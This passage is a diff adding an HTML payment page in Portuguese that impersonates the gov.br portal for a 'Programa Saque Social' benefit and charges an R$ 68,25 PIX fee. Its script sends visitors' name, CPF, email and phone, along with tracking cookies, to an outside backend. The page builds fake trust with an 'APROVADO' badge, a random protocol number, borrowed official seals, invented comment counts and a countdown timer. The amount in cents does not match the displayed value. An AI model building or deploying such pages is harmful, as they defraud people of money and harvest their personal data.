@@ -1,0 +1,737 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+
+<!-- TikTok Pixel Code Start -->
+<script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
+var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
+;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+
+
+  ttq.load('D6ROQ3BC77UA8MCFBSDG');
+  ttq.page();
+}(window, document, 'ttq');
+</script>
+<!-- TikTok Pixel Code End -->
+  
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,maximum-scale=1.0,user-scalable=no">
+  <title>Programa Saque Social - Pagamento</title>
+  <link rel="icon" href="images/favic.png" type="image/png">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Source+Sans+Pro:wght@400;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="css/all.min.css">
+  <style>
+    :root {
+      --gov-blue-primary: #1351B4;
+      --gov-blue-secondary: #0F4DA8;
+      --gov-blue-light: #E8F4FD;
+      --gov-blue-dark: #0C326F;
+      --gov-green: #168821;
+      --gov-gray-light: #F8F9FA;
+      --gov-gray-medium: #E5E5E5;
+      --gov-gray-dark: #495057;
+      --gov-white: #FFFFFF;
+      --gov-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      --gov-shadow-hover: 0 4px 12px rgba(0,0,0,0.15);
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html, body { height: 100%; overflow-x: hidden; }
+    body {
+      font-family: 'Inter', 'Source Sans Pro', -apple-system, BlinkMacSystemFont, sans-serif;
+      background: linear-gradient(135deg, var(--gov-blue-light) 0%, var(--gov-white) 100%);
+      min-height: 100vh;
+      color: var(--gov-gray-dark);
+      line-height: 1.6;
+      display: flex;
+      flex-direction: column;
+      -webkit-font-smoothing: antialiased;
+    }
+    header {
+      background: var(--gov-white);
+      padding: 16px 24px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      box-shadow: var(--gov-shadow);
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+      border-bottom: 3px solid var(--gov-blue-primary);
+    }
+    header .logo img { height: 40px; width: auto; }
+    header .icons { display: flex; align-items: center; gap: 12px; }
+    header .icons button { background: none; border: none; padding: 8px; cursor: pointer; color: var(--gov-blue-primary); transition: all 0.3s; }
+    header .icons button:hover { background: var(--gov-blue-light); }
+    header .icons button i { font-size: 16px; }
+    header .user { background-color: #1451b4; color: #fff; border: none; border-radius: 50px; padding: 6px 16px; display: flex; align-items: center; cursor: pointer; }
+    header .user i { margin-right: 8px; }
+    nav {
+      background: var(--gov-white);
+      padding: 12px 24px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid var(--gov-gray-medium);
+      position: sticky;
+      top: 79px;
+      z-index: 999;
+    }
+    nav button { background: none; border: none; display: flex; align-items: center; cursor: pointer; padding: 8px 12px; border-radius: 8px; transition: all 0.3s; }
+    nav button:hover { background: var(--gov-gray-light); }
+    nav button i { font-size: 16px; color: var(--gov-blue-primary); margin-right: 8px; }
+    nav button p { color: var(--gov-gray-dark); font-size: 14px; font-weight: 400; margin: 0; }
+    nav button span { color: var(--gov-blue-primary); font-weight: 500; }
+    #main-content { padding: 24px 24px 40px; max-width: 720px; flex: 1 0 auto; margin: 0 auto; width: 100%; }
+
+    /* PIX */
+    #pix-section { border-radius: 8px; overflow: hidden; box-shadow: 0 4px 16px rgba(0,0,0,0.13); background: #fff; }
+    .pix-loading-overlay { text-align: center; padding: 50px 16px; }
+    .pix-loading-overlay p { font-size: 14px; color: var(--gov-blue-primary); font-weight: 600; margin-top: 16px; }
+    .pix-big-spin { width: 44px; height: 44px; border: 3px solid #c8d9f5; border-top-color: var(--gov-blue-primary); border-radius: 50%; animation: pspin 0.8s linear infinite; margin: 0 auto; }
+    @keyframes pspin { to { transform: rotate(360deg); } }
+    .pix-erro { padding: 30px 20px; text-align: center; color: #c0392b; font-size: 14px; }
+    .pix-erro button { margin-top: 14px; background: var(--gov-blue-primary); color: #fff; border: none; border-radius: 6px; padding: 10px 22px; font-size: 14px; cursor: pointer; font-family: inherit; }
+    .pix-header { background: linear-gradient(135deg,#0B1A38,#0C326F); padding: 14px 16px; display: flex; align-items: center; justify-content: space-between; }
+    .pix-header-left { display: flex; align-items: center; gap: 10px; }
+    .pix-proto-icon { width: 34px; height: 34px; background: rgba(255,255,255,0.15); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #fff; font-size: 14px; }
+    .pix-proto-label { font-size: 9px; font-weight: 700; letter-spacing: 1.8px; color: #aac4f0; text-transform: uppercase; }
+    .pix-proto-num { font-size: 17px; font-weight: 700; color: #fff; margin-top: 1px; }
+    .pix-badge { background: var(--gov-green); color: #fff; font-size: 11px; font-weight: 700; padding: 5px 13px; border-radius: 50px; display: flex; align-items: center; gap: 5px; }
+    .pix-badge::before { content:''; width:7px; height:7px; background:#fff; border-radius:50%; }
+    .pix-body { padding: 16px; }
+    .pix-aguardando { background: #FFF8E1; border: 1px solid #FFD54F; border-radius: 8px; padding: 10px 14px; font-size: 13px; font-weight: 600; color: #7a5500; display: flex; align-items: center; gap: 8px; margin-bottom: 14px; }
+    .pix-dot { color: #FFB300; font-size: 16px; }
+    .pix-nome-box { background: var(--gov-gray-light); border: 1px solid var(--gov-gray-medium); border-radius: 8px; padding: 12px 16px; text-align: center; margin-bottom: 14px; }
+    .pix-nome-box .pnome { font-size: 15px; font-weight: 700; color: #1a1a1a; }
+    .pix-nome-box .pcpf  { font-size: 13px; color: #6c757d; margin-top: 3px; }
+    .pix-tabs { display: flex; border-radius: 8px; overflow: hidden; border: 1px solid var(--gov-gray-medium); margin-bottom: 14px; }
+    .pix-tab { flex: 1; padding: 10px; font-size: 14px; font-weight: 600; text-align: center; cursor: pointer; background: #fff; color: var(--gov-gray-dark); border: none; transition: all 0.25s; font-family: inherit; }
+    .pix-tab.on { background: var(--gov-blue-primary); color: #fff; }
+    .pix-pane { display: none; }
+    .pix-pane.on { display: block; }
+    .pix-code-box { background: var(--gov-gray-light); border: 1px solid var(--gov-gray-medium); border-radius: 8px; padding: 12px 14px; font-size: 11.5px; color: var(--gov-gray-dark); word-break: break-all; line-height: 1.6; margin-bottom: 12px; font-family: monospace; }
+    .pix-copy-btn { width: 100%; background: linear-gradient(135deg,#1a9e2a,var(--gov-green)); color: #fff; border: none; border-radius: 8px; padding: 15px; font-size: 15px; font-weight: 700; letter-spacing: 0.5px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; transition: all 0.25s; margin-bottom: 16px; text-transform: uppercase; font-family: inherit; }
+    .pix-copy-btn:hover { filter: brightness(0.92); transform: translateY(-1px); }
+    .pix-copy-btn.ok { background: linear-gradient(135deg,#0d6f18,#0a5a14); }
+    .pix-steps { border: 1px solid var(--gov-gray-medium); border-radius: 8px; padding: 14px; margin-bottom: 14px; }
+    .pix-steps-title { font-size: 13px; font-weight: 700; color: #343a40; margin-bottom: 10px; }
+    .pix-step { display: flex; align-items: flex-start; gap: 9px; margin-bottom: 8px; font-size: 13px; color: var(--gov-gray-dark); line-height: 1.45; }
+    .pix-step:last-child { margin-bottom: 0; }
+    .pix-snum { min-width: 22px; height: 22px; background: var(--gov-blue-primary); color: #fff; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 11px; font-weight: 700; flex-shrink: 0; }
+    .pix-qr-wrap { text-align: center; padding: 6px 0 10px; }
+    .pix-qr-wrap p { font-size: 12px; color: #6c757d; margin-bottom: 10px; }
+    .pix-qr-wrap img { border: 1px solid var(--gov-gray-medium); border-radius: 8px; padding: 10px; background: #fff; max-width: 190px; }
+    .pix-acord { border: 1px solid var(--gov-gray-medium); border-radius: 8px; margin-bottom: 10px; overflow: hidden; }
+    .pix-acord-hd { padding: 12px 14px; font-size: 13px; font-weight: 600; color: var(--gov-gray-dark); display: flex; justify-content: space-between; align-items: center; cursor: pointer; background: #fff; user-select: none; }
+    .pix-acord-hd i { color: var(--gov-blue-primary); font-size: 12px; transition: transform 0.3s; }
+    .pix-acord-bd { display: none; padding: 4px 14px 14px; }
+    .pix-acord-bd.open { display: block; }
+    .pix-verif { text-align: center; padding: 14px 16px 10px; border-top: 1px solid #F0F0F0; margin-top: 4px; }
+    .pix-verif-txt { font-size: 13px; color: var(--gov-blue-primary); font-weight: 600; margin-bottom: 10px; display: flex; align-items: center; justify-content: center; gap: 7px; }
+    .pix-spin { width: 14px; height: 14px; border: 2px solid #c8d9f5; border-top-color: var(--gov-blue-primary); border-radius: 50%; animation: pspin 0.8s linear infinite; }
+    .pix-valid { font-size: 12px; color: #6c757d; }
+    .pix-valid b { color: #1a1a1a; }
+    /* Timer gov-style */
+    #gov-timer-bar {
+      background: var(--gov-white);
+      border-bottom: 1px solid var(--gov-gray-medium);
+      padding: 7px 24px;
+      display: none;
+      align-items: center;
+      justify-content: space-between;
+      position: sticky;
+      top: 118px;
+      z-index: 998;
+      gap: 10px;
+    }
+    #gov-timer-bar.visivel { display: flex; }
+    #gov-timer-bar.urgente { background: #FFF3CD; border-bottom-color: #ffc107; }
+    #gov-timer-bar.critico { background: #FDECEA; border-bottom-color: #ef5350; animation: timerPulse 1.2s infinite; }
+    @keyframes timerPulse { 0%,100%{opacity:1;} 50%{opacity:0.85;} }
+    .gov-timer-left { display: flex; align-items: center; gap: 8px; font-size: 13px; color: var(--gov-gray-dark); font-weight: 500; }
+    .gov-timer-left i { color: var(--gov-blue-primary); font-size: 13px; }
+    #gov-timer-bar.urgente .gov-timer-left i { color: #856404; }
+    #gov-timer-bar.urgente .gov-timer-left { color: #856404; }
+    #gov-timer-bar.critico .gov-timer-left i { color: #c0392b; }
+    #gov-timer-bar.critico .gov-timer-left { color: #c0392b; }
+    .gov-timer-digits {
+      display: flex; align-items: center; gap: 4px;
+      background: var(--gov-blue-primary);
+      color: #fff;
+      border-radius: 6px;
+      padding: 4px 10px;
+      font-size: 15px;
+      font-weight: 800;
+      letter-spacing: 1px;
+      font-variant-numeric: tabular-nums;
+      min-width: 70px;
+      justify-content: center;
+    }
+    #gov-timer-bar.urgente .gov-timer-digits { background: #856404; }
+    #gov-timer-bar.critico .gov-timer-digits { background: #c0392b; }
+    .gov-timer-sep { opacity: 0.7; font-size: 14px; }
+    .pix-seg { background: var(--gov-gray-light); border: 1px solid var(--gov-gray-medium); border-radius: 8px; padding: 14px; margin-top: 14px; }
+    .pix-seg-title { font-size: 11px; font-weight: 800; color: #343a40; letter-spacing: 0.8px; text-transform: uppercase; margin-bottom: 12px; }
+    .pix-seg-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+    .pix-seg-item { display: flex; align-items: center; gap: 9px; }
+    .pix-seg-ic { width: 36px; height: 36px; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 15px; flex-shrink: 0; }
+    .pix-seg-ic.g { background: #e8f5e9; color: var(--gov-green); }
+    .pix-seg-ic.b { background: var(--gov-blue-light); color: var(--gov-blue-primary); }
+    .pix-seg-ic.o { background: #FFF3E0; color: #E65100; }
+    .pix-seg-ic.t { background: #E0F2F1; color: #00695C; }
+    .pix-seg-ic.p { background: #EDE7F6; color: #4527A0; }
+    .pix-seg-lbl strong { display: block; font-size: 11.5px; font-weight: 700; color: #1a1a1a; }
+    .pix-seg-lbl span   { font-size: 10.5px; color: #6c757d; }
+    .pix-seg-center { grid-column: 1/-1; display: flex; justify-content: center; }
+    .pix-seg-logo { width: 36px; height: 36px; object-fit: contain; flex-shrink: 0; border-radius: 6px; background: #fff; padding: 2px; }
+
+    /* Comentários */
+    .fb-header-outside { margin-top: 15px; padding: 15px 0 5px 24px; font-size: 14px; font-weight: bold; color: var(--gov-gray-dark); border-top: 1px solid var(--gov-gray-medium); width: 100%; background: var(--gov-white); text-align: left; }
+    .fb-comments-container { width: 100%; background: var(--gov-white); padding: 24px; box-shadow: var(--gov-shadow); }
+    .fb-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px; }
+    .fb-header .fb-comment-count { font-size: 14px; font-weight: bold; color: var(--gov-gray-dark); }
+    .fb-header .fb-loading { font-size: 12px; color: var(--gov-gray-dark); display: flex; align-items: center; }
+    .fb-header .fb-loading i { margin-right: 6px; }
+    .comment-item { display: flex; align-items: flex-start; margin-bottom: 16px; width: 100%; }
+    .comment-avatar { width: 40px; height: 40px; border-radius: 50%; margin-right: 8px; object-fit: cover; }
+    .comment-content { background: var(--gov-gray-light); border-radius: 12px; padding: 8px 12px; position: relative; flex: 1; }
+    .comment-content::before { content: ""; position: absolute; top: 10px; left: -6px; border-top: 6px solid transparent; border-right: 6px solid var(--gov-gray-light); border-bottom: 6px solid transparent; }
+    .comment-name { font-size: 14px; font-weight: bold; color: var(--gov-blue-primary); margin-bottom: 4px; }
+    .comment-text { font-size: 14px; color: var(--gov-gray-dark); line-height: 1.3; }
+    .comment-actions { display: flex; margin-top: 4px; font-size: 12px; color: var(--gov-gray-dark); }
+    .comment-likes { margin-right: 8px; }
+    .comment-dislikes { margin-right: 8px; }
+
+    footer { background: linear-gradient(135deg, var(--gov-blue-dark), #0B1A38); color: var(--gov-white); text-align: center; padding: 16px; font-size: 14px; flex-shrink: 0; }
+
+    @media (max-width: 768px) {
+      header { padding: 12px 16px; }
+      header .logo img { height: 32px; }
+      #main-content { padding: 16px 16px 40px; }
+      .fb-comments-container { padding: 16px; }
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <div class="logo">
+      <img src="images/govbr.png" style="width:90px;margin:10px;">
+    </div>
+    <div class="icons">
+      <button><i class="fas fa-ellipsis-v"></i></button>
+      <button><i class="fas fa-cookie-bite"></i></button>
+      <button><i class="fas fa-th"></i></button>
+      <button class="user" id="user-button" style="background-color:#1451b4;">
+        <i class="fas fa-user" style="color:#fff;"></i>
+        <span id="header-user-name" style="color:#fff;">Usuário</span>
+      </button>
+    </div>
+  </header>
+
+  <nav>
+    <button>
+      <i class="fas fa-bars"></i>
+      <p>Benefício <span> › </span> Indenização <span> › </span> Pagamento</p>
+    </button>
+    <button><i class="fas fa-search"></i></button>
+  </nav>
+
+  <!-- Timer gov-style -->
+  <div id="gov-timer-bar">
+    <div class="gov-timer-left">
+      <i class="fas fa-clock"></i>
+      <span>Sessão expira em</span>
+    </div>
+    <div class="gov-timer-digits">
+      <span id="gov-timer-m">05</span>
+      <span class="gov-timer-sep">:</span>
+      <span id="gov-timer-s">00</span>
+    </div>
+  </div>
+
+  <main id="main-content">
+    <div id="pix-section">
+
+      <!-- Loading enquanto a API gera o PIX -->
+      <div class="pix-loading-overlay" id="pix-loading">
+        <div class="pix-big-spin"></div>
+        <p>Gerando seu PIX, aguarde...</p>
+      </div>
+
+      <!-- Erro -->
+      <div class="pix-erro" id="pix-erro" style="display:none;">
+        <div>Não foi possível gerar o PIX.<br>Verifique sua conexão e tente novamente.</div>
+        <button onclick="pixIniciar()">Tentar novamente</button>
+      </div>
+
+      <!-- Conteúdo principal (aparece após PIX gerado) -->
+      <div id="pix-main" style="display:none;">
+
+        <div class="pix-header">
+          <div class="pix-header-left">
+            <div class="pix-proto-icon"><i class="fas fa-shield-alt"></i></div>
+            <div>
+              <div class="pix-proto-label">Nº do Protocolo</div>
+              <div class="pix-proto-num" id="pix-proto-num">2025.000000.0000</div>
+            </div>
+          </div>
+          <div class="pix-badge">APROVADO</div>
+        </div>
+
+        <div class="pix-body">
+          <div class="pix-aguardando"><span class="pix-dot">●</span> Aguardando confirmação do pagamento</div>
+
+          <div class="pix-nome-box">
+            <div class="pnome" id="pix-nome-show">---</div>
+            <div class="pcpf"  id="pix-cpf-show">---</div>
+          </div>
+
+          <div class="pix-tabs">
+            <button class="pix-tab on" id="ptab-copia" onclick="pixAba('copia')">Copia e Cola</button>
+            <button class="pix-tab"    id="ptab-qr"    onclick="pixAba('qr')">QR Code</button>
+          </div>
+
+          <!-- Copia e Cola -->
+          <div class="pix-pane on" id="ppane-copia">
+            <div class="pix-code-box" id="pix-code-box">---</div>
+            <button class="pix-copy-btn" id="pix-copy-btn" onclick="pixCopiar()">
+              <i class="fas fa-copy"></i><span>COPIAR CÓDIGO PIX</span>
+            </button>
+            <div class="pix-steps">
+              <div class="pix-steps-title">📋 Como pagar com Pix Copia e Cola:</div>
+              <div class="pix-step"><div class="pix-snum">1</div><div>Clique em <b>"Copiar código PIX"</b> acima.</div></div>
+              <div class="pix-step"><div class="pix-snum">2</div><div>Abra o <b>aplicativo do seu banco</b> e acesse a área PIX.</div></div>
+              <div class="pix-step"><div class="pix-snum">3</div><div>Escolha <b>PIX Copia e Cola</b> e cole o código copiado.</div></div>
+              <div class="pix-step"><div class="pix-snum">4</div><div>Confirme o valor de <b id="pix-valor-label">R$ 68,25</b> e finalize o pagamento.</div></div>
+              <div class="pix-step"><div class="pix-snum">5</div><div>Volte aqui e clique em <b>"Já realizei o pagamento"</b>.</div></div>
+            </div>
+          </div>
+
+          <!-- QR Code -->
+          <div class="pix-pane" id="ppane-qr">
+            <div class="pix-qr-wrap">
+              <p>Aponte a câmera do seu banco para o código abaixo:</p>
+              <div id="pix-qr-img"></div>
+            </div>
+            <div class="pix-acord">
+              <div class="pix-acord-hd" onclick="pixToggle(this)">
+                Como realizar o pagamento via QR Code
+                <i class="fas fa-chevron-up"></i>
+              </div>
+              <div class="pix-acord-bd open">
+                <div class="pix-step"><div class="pix-snum">1</div><div>Abra o aplicativo do seu banco.</div></div>
+                <div class="pix-step"><div class="pix-snum">2</div><div>Escolha a opção <b>PIX → QR Code</b>.</div></div>
+                <div class="pix-step"><div class="pix-snum">3</div><div>Escaneie o código e confirme o valor.</div></div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Verificando -->
+          <div class="pix-verif">
+            <div class="pix-verif-txt"><div class="pix-spin"></div> Verificando pagamento... aguarde</div>
+          </div>
+
+          <!-- Seguro -->
+          <div class="pix-seg">
+            <div class="pix-seg-title">🔒 Ambiente 100% Seguro e Regulamentado</div>
+            <div class="pix-seg-grid">
+              <div class="pix-seg-item">
+                <!-- COLOQUE AQUI O LINK DA IMAGEM SSL 256-bit -->
+                <img src="https://img.freepik.com/vetores-premium/logotipo-de-criptografia-ssl-segura-ilustracao-vetorial-de-icone-de-conexao-segura-icone-de-certificado-ssl_526569-864.jpg" class="pix-seg-logo" alt="SSL 256-bit" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'"><div class="pix-seg-ic g" style="display:none"><i class="fas fa-shield-alt"></i></div>
+                <div class="pix-seg-lbl"><strong>SSL 256-bit</strong><span>Conexão segura</span></div>
+              </div>
+              <div class="pix-seg-item">
+                <!-- COLOQUE AQUI O LINK DA IMAGEM BANCO CENTRAL -->
+                <img src="https://assets.infra.grancursosonline.com.br/projeto/bacen.png" class="pix-seg-logo" alt="Banco Central" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'"><div class="pix-seg-ic b" style="display:none"><i class="fas fa-university"></i></div>
+                <div class="pix-seg-lbl"><strong>Banco Central</strong><span>Regulamentado</span></div>
+              </div>
+              <div class="pix-seg-item">
+                <!-- COLOQUE AQUI O LINK DA IMAGEM PIX OFICIAL -->
+                <img src="https://img.icons8.com/color/512/pix.png" class="pix-seg-logo" alt="PIX Oficial" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'"><div class="pix-seg-ic o" style="display:none"><i class="fas fa-bolt"></i></div>
+                <div class="pix-seg-lbl"><strong>PIX Oficial</strong><span>Bacen certificado</span></div>
+              </div>
+              <div class="pix-seg-item">
+                <!-- COLOQUE AQUI O LINK DA IMAGEM GOV.BR -->
+                <img src="https://i.postimg.cc/htg0g3Hz/Design-sem-nome-(12).png" class="pix-seg-logo" alt="gov.br" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'"><div class="pix-seg-ic t" style="display:none"><i class="fas fa-globe"></i></div>
+                <div class="pix-seg-lbl"><strong>gov.br</strong><span>Portal oficial</span></div>
+              </div>
+              <div class="pix-seg-item pix-seg-center">
+                <!-- COLOQUE AQUI O LINK DA IMAGEM LGPD -->
+                <img src="https://www.gov.br/funasa/pt-br/acesso-a-informacao/lei-geral-de-protecao-de-dados-pessoais-lgpd/imagem1-lgpd.png" class="pix-seg-logo" alt="LGPD" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'"><div class="pix-seg-ic p" style="display:none"><i class="fas fa-lock"></i></div>
+                <div class="pix-seg-lbl"><strong>LGPD</strong><span>Dados protegidos</span></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <div class="fb-header-outside" id="fb-header-outside">Comentários (25738)</div>
+  <div class="fb-comments-container" id="fb-comments-container">
+    <div class="fb-header">
+      <span class="fb-comment-count" id="fb-comment-count"></span>
+      <span class="fb-loading" id="fb-loading"></span>
+    </div>
+  </div>
+
+  <footer>Termos de Uso e Aviso de Privacidade
+    <p style="margin-top:8px;font-size:13px;">
+      <a href="termos-uso.html" style="color:#1351B4;text-decoration:none;margin-right:12px;">Termos de Uso</a>
+      <a href="politica-privacidade.html" style="color:#1351B4;text-decoration:none;">Política de Privacidade</a>
+    </p>
+  </footer>
+
+  <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async defer></script>
+  <script>
+    // ===================================================
+    // CONFIGURAÇÃO — edite aqui antes de subir
+    // ===================================================
+    var PIX_API_KEY     = 'sealpay_apikey_vb5g1tookcn';
+    var PIX_VALOR_CENTS = 6187;                          // R$ 68,25 em centavos
+    var PIX_DESCRICAO   = 'Pagamento Aprovado.';
+    var PIX_REDIRECT    = 'https://beneficiogov.vercel.app/up1.html';
+    // ===================================================
+
+    var _pixCode   = '';
+    var _pixTxid   = '';
+    var _pixTimer  = null;
+    var _pixQRFeito = false;
+
+    // Lê parâmetros vindos da URL  ?nome=...&cpf=...&email=...&telefone=...
+    var _p     = new URLSearchParams(window.location.search);
+    var _nome  = (_p.get('nome')      || '').trim();
+    var _cpf   = (_p.get('cpf')       || '').replace(/\D/g, '');
+    var _email = (_p.get('email')     || 'cliente@email.com').trim();
+    var _fone  = (_p.get('telefone')  || '11999999999').replace(/\D/g, '');
+
+    function formatarNome(n) {
+      if (!n) return '';
+      return n.toLowerCase().split(' ').filter(Boolean)
+        .map(function(w){ return w.charAt(0).toUpperCase() + w.slice(1); }).join(' ');
+    }
+    function formatarCPF(c) {
+      return c.replace(/\D/g,'').replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+    }
+    function getCookie(name) {
+      var v = document.cookie.match('(^|;) ?' + name + '=([^;]*)(;|$)');
+      return v ? v[2] : '';
+    }
+    function getUtmParams() {
+      return {
+        utm_source:   _p.get('utm_source')   || '',
+        utm_medium:   _p.get('utm_medium')   || '',
+        utm_campaign: _p.get('utm_campaign') || '',
+        utm_term:     _p.get('utm_term')     || '',
+        utm_content:  _p.get('utm_content')  || ''
+      };
+    }
+    function gerarProtocolo() {
+      return new Date().getFullYear() + '.' +
+        Math.floor(Math.random()*900000+100000) + '.' +
+        Math.floor(Math.random()*9000+1000);
+    }
+
+    var nomeOk = formatarNome(_nome);
+    if (nomeOk) document.getElementById('header-user-name').textContent = nomeOk.split(' ')[0];
+
+    // ===================================================
+    // GERA PIX VIA SEALPAY
+    // ===================================================
+    async function pixIniciar() {
+      document.getElementById('pix-loading').style.display = 'block';
+      document.getElementById('pix-erro').style.display    = 'none';
+      document.getElementById('pix-main').style.display    = 'none';
+      _pixQRFeito = false;
+      if (_pixTimer) { clearInterval(_pixTimer); _pixTimer = null; }
+
+      try {
+        await fetch('https://abacate-5eo1.onrender.com/api/visita', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ api_key: PIX_API_KEY, visit: 1, origem: document.referrer || window.location.href })
+        });
+      } catch(e) {}
+
+      try {
+        // Garante nome com pelo menos 2 palavras (exigência da API)
+        var nomeEnvio = nomeOk || 'Cliente';
+        if (nomeEnvio.trim().split(' ').filter(Boolean).length < 2) {
+          nomeEnvio = nomeEnvio.trim() + ' Pagador';
+        }
+
+        // CPF limpo, só números
+        var cpfEnvio = _cpf.replace(/\D/g, '');
+
+        // Email válido
+        var emailEnvio = _email && _email.indexOf('@') > 0 ? _email : 'pagador@gmail.com';
+
+        var payload = {
+            amount:      PIX_VALOR_CENTS,
+            description: PIX_DESCRICAO,
+            api_key:     PIX_API_KEY,
+            customer: {
+              name:      nomeEnvio,
+              email:     emailEnvio,
+              cellphone: _fone || '11999999999',
+              taxId:     cpfEnvio
+            },
+            tracking: { utm: getUtmParams(), src: window.location.href },
+            fbp:        getCookie('_fbp') || '',
+            fbc:        getCookie('_fbc') || '',
+            user_agent: navigator.userAgent
+        };
+
+        console.log('PIX payload:', JSON.stringify(payload));
+
+        var res = await fetch('https://abacate-5eo1.onrender.com/create-pix4', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+
+        var data = await res.json();
+        console.log('PIX resposta:', JSON.stringify(data));
+
+        if (!res.ok) throw new Error('API erro ' + res.status + ': ' + JSON.stringify(data));
+        if (!data.pix_code) throw new Error('PIX não gerado: ' + JSON.stringify(data));
+
+        _pixCode = data.pix_code;
+        _pixTxid = data.txid;
+
+        document.getElementById('pix-proto-num').textContent   = gerarProtocolo();
+        document.getElementById('pix-nome-show').textContent   = nomeOk || 'Cliente';
+        document.getElementById('pix-cpf-show').textContent    = _cpf ? formatarCPF(_cpf) : '---';
+        document.getElementById('pix-valor-label').textContent = 'R$ ' + (PIX_VALOR_CENTS/100).toFixed(2).replace('.',',');
+        document.getElementById('pix-code-box').textContent    = _pixCode;
+
+        // QR via imagem base64 retornada pela API
+        if (data.pix_qr_code) {
+          var imgEl = document.createElement('img');
+          imgEl.src = data.pix_qr_code;
+          imgEl.alt = 'QR Code PIX';
+          imgEl.style.cssText = 'border-radius:8px;max-width:190px;';
+          document.getElementById('pix-qr-img').innerHTML = '';
+          document.getElementById('pix-qr-img').appendChild(imgEl);
+          _pixQRFeito = true;
+        }
+
+        document.getElementById('pix-loading').style.display = 'none';
+        document.getElementById('pix-main').style.display    = 'block';
+
+        pixPolling();
+        pixIniciarTimer();
+
+      } catch(err) {
+        console.error('Erro PIX detalhado:', err);
+        document.getElementById('pix-loading').style.display = 'none';
+        var erroEl = document.getElementById('pix-erro');
+        erroEl.style.display = 'block';
+        erroEl.querySelector('div').textContent = 'Não foi possível gerar o PIX. (' + (err.message || 'Erro desconhecido') + ')';
+      }
+    }
+
+    function pixPolling() {
+      if (!_pixTxid) {
+        console.error('Polling: txid vazio, abortando.');
+        return;
+      }
+      console.log('Polling iniciado para txid:', _pixTxid);
+      var tentativas = 0;
+      _pixTimer = setInterval(async function() {
+        tentativas++;
+        if (tentativas > 180) {
+          console.warn('Polling: timeout de 15 minutos atingido.');
+          clearInterval(_pixTimer);
+          return;
+        }
+        try {
+          var url = 'https://abacate-5eo1.onrender.com/api/payment-status/' + _pixTxid;
+          var r = await fetch(url);
+          var s = await r.json();
+          console.log('Polling tentativa ' + tentativas + ':', JSON.stringify(s));
+
+          // Verifica status em diferentes formatos possíveis da API
+          var status = (s.status || s.Status || s.payment_status || s.paymentStatus || '').toLowerCase();
+          var statusesAprovados = ['paid', 'approved', 'confirmed', 'completed', 'active'];
+
+          if (statusesAprovados.includes(status)) {
+            console.log('PAGAMENTO APROVADO! Status:', status, '— Redirecionando...');
+            clearInterval(_pixTimer);
+            clearInterval(_timerInterval);
+            if (PIX_REDIRECT && PIX_REDIRECT !== 'https://seusite.com/obrigado') {
+              window.location.href = PIX_REDIRECT;
+            } else {
+              console.warn('PIX_REDIRECT não configurado! Configure a URL de redirecionamento.');
+              alert('Pagamento confirmado! Configure a URL de redirecionamento no arquivo index.html (variável PIX_REDIRECT).');
+            }
+          }
+        } catch(e) {
+          console.error('Polling erro tentativa ' + tentativas + ':', e);
+        }
+      }, 5000);
+    }
+
+    function pixAba(aba) {
+      document.getElementById('ptab-copia').classList.toggle('on', aba==='copia');
+      document.getElementById('ptab-qr').classList.toggle('on',    aba==='qr');
+      document.getElementById('ppane-copia').classList.toggle('on', aba==='copia');
+      document.getElementById('ppane-qr').classList.toggle('on',    aba==='qr');
+      if (aba === 'qr' && !_pixQRFeito && _pixCode) {
+        _pixQRFeito = true;
+        var wrap = document.getElementById('pix-qr-img');
+        wrap.innerHTML = '';
+        var img = document.createElement('img');
+        img.src = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' + encodeURIComponent(_pixCode);
+        img.alt = 'QR Code PIX';
+        img.style.cssText = 'border-radius:8px;max-width:190px;';
+        wrap.appendChild(img);
+      }
+    }
+
+    function pixCopiar() {
+      if (!_pixCode) return;
+      var btn  = document.getElementById('pix-copy-btn');
+      var orig = btn.innerHTML;
+      function ok() {
